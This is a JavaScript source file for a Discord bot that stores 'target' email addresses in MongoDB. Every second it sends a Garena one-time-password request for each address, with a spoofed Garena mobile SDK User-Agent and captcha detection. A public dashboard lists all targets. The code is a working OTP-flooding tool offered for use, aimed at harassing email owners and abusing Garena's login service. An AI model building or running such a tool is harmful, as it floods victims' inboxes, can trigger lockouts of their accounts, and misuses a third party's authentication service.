import dotenv from 'dotenv';
import http from 'http';
import {
  Client,
  GatewayIntentBits,
  Partials,
  SlashCommandBuilder,
  REST,
  Routes,
  MessageFlags
} from 'discord.js';
import fetch from 'node-fetch';
import mongoose from 'mongoose';

dotenv.config();

const port = process.env.PORT || 3000;
const token = process.env.DISCORD_TOKEN;
const otpEndpoint = process.env.OTP_ENDPOINT;
const mongoUri = process.env.MONGODB_URI;

const allowedGuilds = (process.env.ALLOWED_GUILD_IDS || '')
  .split(',')
  .map(id => id.trim())
  .filter(Boolean);

const allowedUsers = (process.env.ALLOWED_USER_IDS || '')
  .split(',')
  .map(id => id.trim())
  .filter(Boolean);

// MongoDB Email Model
const emailSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true
  },
  addedAt: {
    type: Date,
    default: Date.now
  }
});

const EmailModel = mongoose.model('Email', emailSchema);

// In-memory cache for fast 0ms access during 1-second OTP loop
let cachedEmails = [];
let isDbConnected = false;

function loadEmails() {
  return [...cachedEmails];
}

async function connectToDatabase() {
  try {
    console.log('[MongoDB] Connecting to MongoDB Atlas...');
    await mongoose.connect(mongoUri, {
      serverSelectionTimeoutMS: 8000
    });
    isDbConnected = true;
    console.log('[MongoDB] Connected successfully to database!');

    // Fetch registered emails from MongoDB
    const docs = await EmailModel.find({}).sort({ addedAt: 1 }).lean();
    cachedEmails = docs.map(d => d.email.toLowerCase().trim()).filter(Boolean);
    console.log(`[MongoDB] Active registered emails loaded: ${cachedEmails.length}`);
  } catch (err) {
    console.error('[MongoDB] Connection error:', err.message);
    isDbConnected = false;
    cachedEmails = [];
  }
}


// HTTP Server for Render Health Check, JSON API, and Web Dashboard
http.createServer((req, res) => {
  const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  // JSON API Endpoint (/api/emails or /emails)
  if (parsedUrl.pathname === '/api/emails' || parsedUrl.pathname === '/emails') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify({
      status: 'online',
      database: isDbConnected ? 'MongoDB Connected' : 'Disconnected',
      count: cachedEmails.length,
      emails: cachedEmails,
      timestamp: new Date().toISOString()
    }, null, 2));
    return;
  }

  // Dashboard homepage
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  const emailItems = cachedEmails.length === 0
    ? '<li style="color:#94a3b8;font-style:italic;padding:0.75rem 0;">No emails registered yet. Add using Discord: <code>/mail add &lt;email&gt;</code></li>'
    : cachedEmails.map((e, idx) => `<li style="padding:0.6rem 0;border-bottom:1px solid #334155;font-family:monospace;color:#f1f5f9;"><span style="color:#38bdf8;margin-right:0.5rem;">${idx + 1}.</span>${e}</li>`).join('');

  res.end(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord OTP Bot Dashboard</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0f19; color: #f8fafc; padding: 2rem 1rem; display: flex; justify-content: center; }
    .card { background: #151d30; border-radius: 14px; padding: 2rem; max-width: 620px; width: 100%; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid #1e293b; }
    .header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1.5rem; }
    h1 { font-size: 1.4rem; color: #38bdf8; display: flex; align-items: center; gap: 0.5rem; }
    .badges { display: flex; gap: 0.5rem; flex-wrap: wrap; }
    .badge { padding: 0.25rem 0.65rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.04em; }
    .badge-green { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
    .badge-blue { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4); }
    .badge-red { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
    .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem; }
    .stat { background: #0b0f19; padding: 1.2rem; border-radius: 10px; border: 1px solid #1e293b; }
    .stat-label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; }
    .stat-val { font-size: 1.6rem; font-weight: 700; color: #f8fafc; margin-top: 0.35rem; }
    .list-box { background: #0b0f19; border-radius: 10px; padding: 1.2rem; border: 1px solid #1e293b; }
    .list-box h2 { font-size: 0.85rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.75rem; display: flex; justify-content: space-between; }
    ul { list-style: none; }
    .footer { margin-top: 1.5rem; font-size: 0.8rem; color: #64748b; text-align: center; line-height: 1.6; }
    a { color: #38bdf8; text-decoration: none; }
    a:hover { text-decoration: underline; }
    code { background: #1e293b; padding: 0.15rem 0.4rem; border-radius: 4px; font-size: 0.8rem; color: #38bdf8; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>⚡ OTP Limiter</h1>
      <div class="badges">
        <span class="badge badge-green">● Bot Online</span>
        <span class="badge ${isDbConnected ? 'badge-blue' : 'badge-red'}">🗄️ ${isDbConnected ? 'MongoDB Connected' : 'DB Disconnected'}</span>
      </div>
    </div>
    <div class="stats">
      <div class="stat">
        <div class="stat-label">Active Registered Emails</div>
        <div class="stat-val">${cachedEmails.length}</div>
      </div>
      <div class="stat">
        <div class="stat-label">Loop Interval</div>
        <div class="stat-val">1 sec</div>
      </div>
    </div>
    <div class="list-box">
      <h2><span>Registered Target Emails</span><span>${cachedEmails.length} active</span></h2>
      <ul>${emailItems}</ul>
    </div>
    <div class="footer">
      Raw JSON endpoint: <a href="/api/emails">/api/emails</a><br>
      Manage emails via Discord using <code>/mail add &lt;email&gt;</code> and <code>/mail remove &lt;email&gt;</code>
    </div>
  </div>
</body>
</html>`);
}).listen(port, () => {
  console.log(`[HTTP] Health check & Dashboard server listening on port ${port}`);
});


function isAuthorized(guildId, userId) {
  if (allowedGuilds.length > 0 && (!guildId || !allowedGuilds.includes(guildId))) {
    return { authorized: false, reason: 'This command cannot be used in this server.' };
  }
  if (allowedUsers.length > 0 && !allowedUsers.includes(userId)) {
    return { authorized: false, reason: 'You do not have permission to execute this command.' };
  }
  return { authorized: true };
}

async function sendGarenaOtpRequest(email) {
  if (!otpEndpoint) {
    throw new Error('OTP_ENDPOINT is not configured in .env or environment variables');
  }

  let hostHeader = '';
  try {
    hostHeader = new URL(otpEndpoint).host;
  } catch (err) {
    throw new Error(`Invalid OTP_ENDPOINT URL: ${err.message}`);
  }

  const isDirectGarena = otpEndpoint.includes('garena');

  if (isDirectGarena) {
    const bodyParams = new URLSearchParams({
      app_id: '100067',
      email: email,
      locale: 'en_IN'
    });

    const res = await fetch(otpEndpoint, {
      method: 'POST',
      headers: {
        'User-Agent': 'GarenaMSDK/4.0.39(ASUS_Z01QD ;Android 9;en;US;)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': hostHeader,
        'Connection': 'Keep-Alive'
      },
      body: bodyParams.toString()
    });

    const text = await res.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text };
    }
    return { status: res.status, data };
  } else {
    const res = await fetch(otpEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email })
    });

    const text = await res.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text };
    }
    return { status: res.status, data };
  }
}

async function runOtpCycle() {
  const emails = loadEmails();
  if (emails.length === 0) return;

  const timestamp = new Date().toLocaleTimeString();
  console.log(`\n[${timestamp}] -- Running OTP cycle for ${emails.length} active email(s) --`);

  for (const email of emails) {
    const currentList = loadEmails();
    if (!currentList.includes(email)) {
      console.log(`[${timestamp}] [SKIPPED] ${email} (removed in)`);
      continue;
    }

    try {
      const { status, data } = await sendGarenaOtpRequest(email);
      if (data?.result === 0) {
        console.log(`[${timestamp}] [SUCCESS] OTP requested for ${email} (Garena confirmed: OTP sent)`);
      } else if (data?.url) {
        console.warn(`[${timestamp}] [WARNING] Garena required Captcha for ${email}`);
      } else {
        console.log(`[${timestamp}] [INFO] OTP request sent for ${email} (HTTP ${status}):`, data?.message || data?.error || data);
      }
    } catch (err) {
      console.error(`[${timestamp}] [ERROR] Failed OTP request for ${email}:`, err.message);
    }
  }
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel]
});

const commands = [
  new SlashCommandBuilder()
    .setName('mail')
    .setDescription('Manage email addresses')
    .addSubcommand(sub =>
      sub.setName('add')
        .setDescription('Add an email')
        .addStringOption(opt =>
          opt.setName('email')
            .setDescription('Target email address')
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName('remove')
        .setDescription('Remove an email')
        .addStringOption(opt =>
          opt.setName('email')
            .setDescription('Target email address')
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName('list')
        .setDescription('List all registered emails')
    ),

  new SlashCommandBuilder()
    .setName('sendnow')
    .setDescription('Immediately trigger a OTP')
    .addStringOption(opt =>
      opt.setName('email')
        .setDescription('Optional: specific email (defaults to all registered emails)')
        .setRequired(false)
    )
];

client.once('clientReady', async () => {
  console.log(`Discord Bot logged in as ${client.user.tag}`);
  console.log(`Target Endpoint: ${otpEndpoint}`);
  console.log(`Allowed Servers: ${allowedGuilds.length ? allowedGuilds.join(', ') : 'All Servers'}`);
  console.log(`Allowed Users: ${allowedUsers.length ? allowedUsers.join(', ') : 'All Users'}`);

  const rest = new REST({ version: '10' }).setToken(token);
  const commandPayload = commands.map(c => c.toJSON());

  try {
    console.log('Refreshing slash commands to prevent duplicates...');

    if (allowedGuilds.length > 0) {
      await rest.put(Routes.applicationCommands(client.user.id), { body: [] });
      console.log('Cleared global commands');

      for (const guildId of allowedGuilds) {
        try {
          await rest.put(Routes.applicationGuildCommands(client.user.id, guildId), { body: commandPayload });
          console.log(`Registered slash commands in guild: ${guildId}`);
        } catch (gErr) {
          console.warn(`Could not register in guild ${guildId}:`, gErr.message);
        }
      }
    } else {
      await rest.put(Routes.applicationCommands(client.user.id), { body: commandPayload });
      console.log('Registered global slash commands');
    }
  } catch (err) {
    console.error('Error refreshing slash commands:', err);
  }

  setInterval(runOtpCycle, 1 * 1000);
  console.log('OTP Request cycle active (runs every 1 second)');
});

async function handleAddEmail(email) {
  if (!email || !email.includes('@')) {
    return { success: false, message: 'Please provide a valid email address.' };
  }
  const lower = email.toLowerCase().trim();
  if (cachedEmails.includes(lower)) {
    return { success: false, message: `[!] **${lower}** is already in the list.` };
  }

  // 1. Persist to MongoDB
  if (isDbConnected) {
    try {
      await EmailModel.updateOne(
        { email: lower },
        { $setOnInsert: { email: lower, addedAt: new Date() } },
        { upsert: true }
      );
    } catch (err) {
      console.error('[MongoDB] Error saving email:', err.message);
    }
  }

  // 2. Update in-memory cache
  if (!cachedEmails.includes(lower)) {
    cachedEmails.push(lower);
  }

  let immediateFeedback = '';
  try {
    const { data } = await sendGarenaOtpRequest(lower);
    if (data?.result === 0) {
      immediateFeedback = '**OTP request dispatched immediately!**';
    } else {
      immediateFeedback = `request sent (Garena: ${data?.message || data?.error || 'Sent'})`;
    }
  } catch (err) {
    immediateFeedback = `Immediate request encountered: ${err.message}`;
  }

  return {
    success: true,
    message: `Added **${lower}** to MongoDB & active loop!\n${immediateFeedback}\nAutomatic requests will continue every 1 second.`
  };
}

async function handleRemoveEmail(email) {
  if (!email) {
    return { success: false, message: 'Please specify the email to remove.' };
  }
  const lower = email.toLowerCase().trim();
  const index = cachedEmails.indexOf(lower);
  if (index === -1) {
    return { success: false, message: `[!] **${lower}** was not found in the list.` };
  }

  // 1. Delete from MongoDB
  if (isDbConnected) {
    try {
      await EmailModel.deleteOne({ email: lower });
    } catch (err) {
      console.error('[MongoDB] Error removing email:', err.message);
    }
  }

  // 2. Update in-memory cache
  cachedEmails.splice(index, 1);

  return {
    success: true,
    message: `**Stopped:** Removed **${lower}** from MongoDB.\nNo further OTP requests will be sent to this email.`
  };
}

function handleListEmails() {
  const emailList = loadEmails();
  if (emailList.length === 0) {
    return { count: 0, message: 'No emails are currently registered.' };
  }
  const formatted = emailList.map((m, idx) => `**${idx + 1}.** \`${m}\``).join('\n');
  return {
    count: emailList.length,
    message: `**Active Registered Emails (${emailList.length}):**\n${formatted}\n\n*Persisted in MongoDB Atlas • OTP requests running every 1 second.*`
  };
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const auth = isAuthorized(interaction.guildId, interaction.user.id);
  if (!auth.authorized) {
    return interaction.reply({ content: `[Access Denied] ${auth.reason}`, flags: MessageFlags.Ephemeral });
  }

  const { commandName, options } = interaction;

  if (commandName === 'mail') {
    const sub = options.getSubcommand();

    if (sub === 'add') {
      const email = options.getString('email');
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
      const result = await handleAddEmail(email);
      return interaction.editReply({ content: result.message });
    }

    if (sub === 'remove') {
      const email = options.getString('email');
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
      const result = await handleRemoveEmail(email);
      return interaction.editReply({ content: result.message });
    }

    if (sub === 'list') {
      const result = handleListEmails();
      return interaction.reply({ content: result.message, flags: MessageFlags.Ephemeral });
    }
  }

  if (commandName === 'sendnow') {
    const targetEmail = options.getString('email')?.toLowerCase()?.trim();
    const emails = targetEmail ? [targetEmail] : loadEmails();

    if (emails.length === 0) {
      return interaction.reply({
        content: 'No emails to send to. Add one first with `/mail add <email>`',
        flags: MessageFlags.Ephemeral
      });
    }

    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    const results = [];
    for (const email of emails) {
      try {
        const { data } = await sendGarenaOtpRequest(email);
        results.push(`* **${email}**: ${data?.result === 0 ? '[SUCCESS] OTP requested successfully' : `[WARNING] ${data?.message || data?.error || 'Requested'}`}`);
      } catch (err) {
        results.push(`* **${email}**: [ERROR] Failed (${err.message})`);
      }
    }
    return interaction.editReply({ content: `**Manual OTP Request Results:**\n${results.join('\n')}` });
  }
});

client.on('messageCreate', async message => {
  if (message.author.bot || !message.content.startsWith('!')) return;

  const auth = isAuthorized(message.guildId, message.author.id);
  if (!auth.authorized) return;

  const raw = message.content.slice(1).trim();
  const lower = raw.toLowerCase();

  if (lower.startsWith('mail add ')) {
    const parts = raw.split(/\s+/);
    const email = parts[2];
    const msg = await message.reply('Adding and requesting OTP...');
    const res = await handleAddEmail(email);
    return msg.edit(res.message);
  }

  if (lower.startsWith('mail remove ')) {
    const parts = raw.split(/\s+/);
    const email = parts[2];
    const msg = await message.reply('Removing email from database...');
    const res = await handleRemoveEmail(email);
    return msg.edit(res.message);
  }

  if (lower === 'mail list') {
    const res = handleListEmails();
    return message.reply(res.message);
  }

  if (lower.startsWith('sendnow')) {
    const parts = raw.split(/\s+/);
    const emailArg = parts[1]?.toLowerCase()?.trim();
    const emails = emailArg ? [emailArg] : loadEmails();
    if (emails.length === 0) {
      return message.reply('No emails registered. Use `!mail add <email>` first.');
    }
    const msg = await message.reply('Requesting OTP from Garena...');
    const results = [];
    for (const email of emails) {
      try {
        const { data } = await sendGarenaOtpRequest(email);
        results.push(`* **${email}**: ${data?.result === 0 ? '[SUCCESS] OTP sent' : `[WARNING] ${data?.message || data?.error || 'Requested'}`}`);
      } catch (err) {
        results.push(`* **${email}**: [ERROR] Failed (${err.message})`);
      }
    }
    return msg.edit(`**OTP Request Results:**\n${results.join('\n')}`);
  }
});

async function startBot() {
  await connectToDatabase();

  if (!token || token === 'YOUR_DISCORD_BOT_TOKEN') {
    console.error('[ERROR] Please configure your DISCORD_TOKEN in .env or environment variables');
  } else if (!otpEndpoint) {
    console.error('[ERROR] Please configure OTP_ENDPOINT in .env or environment variables');
  } else {
    client.login(token).catch(err => {
      console.error('[ERROR] Discord login failed:', err.message);
    });
  }
}

startBot();

